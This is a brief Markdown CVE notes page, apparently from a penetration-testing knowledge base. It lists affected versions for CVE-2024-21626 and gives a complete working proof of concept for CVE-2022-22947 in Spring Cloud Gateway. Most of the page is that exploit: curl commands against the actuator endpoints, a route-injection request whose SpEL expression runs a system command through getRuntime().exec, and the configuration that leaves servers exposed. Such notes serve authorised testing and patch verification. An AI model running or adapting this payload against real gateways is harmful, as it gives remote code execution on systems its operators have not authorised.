---
title: CVE
---

# CVE

- https://www.cve.org/

## CVE-2024-21626

- containerd 1.5.13 - 1.6.20
- 1.0.0-rc93 <= runc <= 1.1.11
- https://help.aliyun.com/noticelist/articleid/1069353299.html

## CVE-2022-22947

- Java, SpringCloud Gateway
  - 3.1.0
  - 3.0.0-3.0.6
  - < 3.0

```bash
# 测试 gateway 是否开启 actuator 管理
curl -X POST http://gateway/actuator/gateway/refresh -v
```

**注入恶意路由**

```http
POST http://gateway/actuator/gateway/routes/pentest
Content-Type: application/json

{
  "id": "pentest",
  "filters": [
    {
      "name": "AddResponseHeader",
      "args": {
        "name": "X-Request-Foo",
        "": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
      },
      "uri": "http://httpbin.org/get",
      "predicates": [
        {
          "name": "Method",
          "args": {
            "_key_0": "GET"
          }
        },
        {
          "name": "Path",
          "args": {
            "_key_0": "/pentest"
          }
        }
      ]
    }
  ]
}
```

```bash
# 刷新
curl -X POST http://gateway/actuator/gateway/refresh -v
# 新的路由包含 X-Request-Foo: $(whoami)
curl -X POST http://gateway/pentest -v
```

**配置不同时满足即可**

```ini
management.endpoint.gateway.enabled=true # default value
management.endpoints.web.exposure.include=gateway
```

- https://spring.io/security/cve-2022-22947
- https://www.anquanke.com/post/id/269795
